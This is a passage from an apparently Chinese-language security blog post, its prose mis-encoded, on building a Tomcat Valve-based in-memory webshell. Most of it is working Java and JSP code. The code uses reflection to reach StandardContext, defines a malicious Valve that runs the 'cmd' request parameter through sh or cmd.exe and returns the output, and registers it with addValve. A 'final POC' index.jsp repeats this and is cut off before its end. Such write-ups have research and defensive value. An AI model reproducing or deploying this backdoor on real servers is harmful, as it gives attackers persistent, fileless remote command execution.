</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">backgroundProcess</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//æ‰§è¡Œå¯¹åº”è¯·æ±‚å¤„ç†é€»è¾‘</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isAsyncSupported</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨Tomcatä¸­çš„Valveå®ç°ç±»æ˜¯ValveBaseæŠ½è±¡ç±»ï¼Œå…¶å®ç°äº†å¤§éƒ¨åˆ†Valveæ¥å£çš„åŸºæœ¬æ–¹æ³•ï¼Œåªéœ€è¦é‡å†™invoke()æ–¹æ³•ã€‚</p>
<p>è€Œçœ‹Pipelineæ¥å£çš„å®ç°ç±»StandardPipelineï¼Œå…¶å®šä¹‰æœ‰addValve()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055673.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240904150212982"
	
	
></p>
<p>è€Œåœ¨å‰é¢è¯´è¿‡ï¼ŒContainerçš„å››ä¸ªå®¹å™¨éƒ½æ˜¯æœ‰å…¶ç›¸å¯¹åº”çš„Valveçš„ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œ<strong>å››ä¸ªå®¹å™¨çš„å®ç°ç±»StandardEngineã€StandardHostç­‰éƒ½æ˜¯ç»§æ‰¿äºContainerBaseç±»çš„ï¼Œå¹¶ä¸”è¿™ä¸ªContainerBaseç±»ä¸­æœ‰addValve()æ–¹æ³•</strong>ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055828.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240904150639229"
	
	
></p>
<p>å…¶å®ä¹Ÿå°±æ˜¯è°ƒç”¨çš„StandardPipelineç±»çš„addValve()æ–¹æ³•ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055811.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240904150715679"
	
	
></p>
<p>â€”â€”â€”â€”</p>
<p>ç°åœ¨å°±å¯ä»¥å°è¯•æ¥ç›´æ¥æ„é€ äº†ï¼Œè¿‡ç¨‹ï¼š</p>
<ul>
<li>åå°„ä»HttpRequestServlet è·å– Request</li>
<li>åå°„ä» Request è·å–StandardContext</li>
<li>è·å–åˆ°äº†StandardContextå°±å¯ä»¥å°è¯•ç›´æ¥å‘é‡Œé¢æ·»åŠ æ¶æ„Valveäº†ã€‚</li>
</ul>
<p>è·å–StandardContextç­‰å››ä¸ªå®¹å™¨å¯¹è±¡éƒ½å¯ä»¥ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Field</span><span class="w"> </span><span class="n">requestField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;request&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">requestField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Request</span><span class="w"> </span><span class="n">request1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Request</span><span class="p">)</span><span class="w"> </span><span class="n">requestField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">request</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="w"> </span><span class="n">request1</span><span class="p">.</span><span class="na">getContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//    StandardHost standardHost = (StandardHost) request1.getHost();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//    StandardWrapper standardWrapper = (StandardWrapper) request1.getWrapper();</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æˆ‘æ˜¯tomcat9ï¼Œåº”è¯¥æ˜¯ç”¨ä¸äº†è¿™ä¸ªï¼Œè¿˜æ˜¯å›åˆ°ä¹‹å‰é‚£ä¸ªè·å–StandardContext()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ServletContext</span><span class="w"> </span><span class="n">servletContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">applicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="n">field0</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">applicationContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">field1</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å®šä¹‰æ¶æ„Valveï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ValveBase</span><span class="w"> </span><span class="n">badValve</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ValveBase</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Request</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="n">resp</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kt">boolean</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">String</span><span class="w"> </span><span class="n">osTyp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&#34;os.name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">osTyp</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">osTyp</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;win&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">)}).</span><span class="na">getInputStream</span><span class="p">())</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">,</span><span class="s">&#34;/c&#34;</span><span class="p">,</span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">)}).</span><span class="na">getInputStream</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">in</span><span class="p">).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\A&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">String</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">resp</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">write</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">this</span><span class="p">.</span><span class="na">getNext</span><span class="p">().</span><span class="na">invoke</span><span class="p">(</span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">resp</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åç›´æ¥åŠ å…¥å³å¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ServletContext</span><span class="w"> </span><span class="n">servletContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">applicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="n">field0</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">applicationContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">field1</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ValveBase</span><span class="w"> </span><span class="n">badValve</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ValveBase</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Request</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="n">resp</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kt">boolean</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">String</span><span class="w"> </span><span class="n">osTyp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&#34;os.name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">osTyp</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">osTyp</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;win&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">)}).</span><span class="na">getInputStream</span><span class="p">())</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">,</span><span class="s">&#34;/c&#34;</span><span class="p">,</span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">)}).</span><span class="na">getInputStream</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">in</span><span class="p">).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\A&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">String</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">resp</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">write</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">this</span><span class="p">.</span><span class="na">getNext</span><span class="p">().</span><span class="na">invoke</span><span class="p">(</span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">resp</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardContext</span><span class="p">.</span><span class="na">addValve</span><span class="p">(</span><span class="n">badValve</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h6 id="æœ€ç»ˆpoc-3">æœ€ç»ˆPOC
</h6><p>index.jspï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javax.servlet.*&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.valves.ValveBase&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.connector.Response&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%
</span></span><span class="line"><span class="cl">    ServletContext servletContext = request.getSession().getServletContext();
</span></span><span class="line"><span class="cl">    Field field0 = servletContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">    field0.setAccessible(true);
</span></span><span class="line"><span class="cl">    ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext);
</span></span><span class="line"><span class="cl">    Field field1 = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">    field1.setAccessible(true);
</span></span><span class="line"><span class="cl">    StandardContext standardContext = (StandardContext)field1.get(applicationContext);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    ValveBase badValve = new ValveBase() {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        public void invoke(Request req, Response resp){
</span></span><span class="line"><span class="cl">            try {
</span></span><span class="line"><span class="cl">                if (req.getParameter(&#34;cmd&#34;) != null) {
</span></span><span class="line"><span class="cl">                    boolean isLinux = true;
</span></span><span class="line"><span class="cl">                    String osTyp = System.getProperty(&#34;os.name&#34;);
</span></span><span class="line"><span class="cl">                    if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {
</span></span><span class="line"><span class="cl">                        isLinux = false;
</span></span><span class="line"><span class="cl">                    }
</span></span><span class="line"><span class="cl">                    InputStream in = isLinux ? (Runtime.getRuntime().exec(new String[]{&#34;sh&#34;, &#34;-c&#34;,req.getParameter(&#34;cmd&#34;)}).getInputStream()) : (Runtime.getRuntime().exec(new String[]{&#34;cmd.exe&#34;,&#34;/c&#34;,req.getParameter(&#34;cmd&#34;)}).getInputStream());
</span></span><span class="line"><span class="cl">                    Scanner s = new Scanner(in).useDelimiter(&#34;\\A&#34;);
</span></span><span class="line"><span class="cl">                    String o = s.hasNext() ? s.next() : &#34;&#34;;
</span></span><span class="line"><span class="cl">                    resp.getWriter().write(o);
</span></span><span class="line"><span class="cl">                }
</span></span><span class="line"><span class="cl">                this.getNext().invoke(req, resp);
</span></span><span class="line"><span class="cl">            } catch (Exception e) {
</span></span><span class="line"><span class="cl">                e.printStackTrace();
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    };
</span></span><span class="line"><span class="cl">
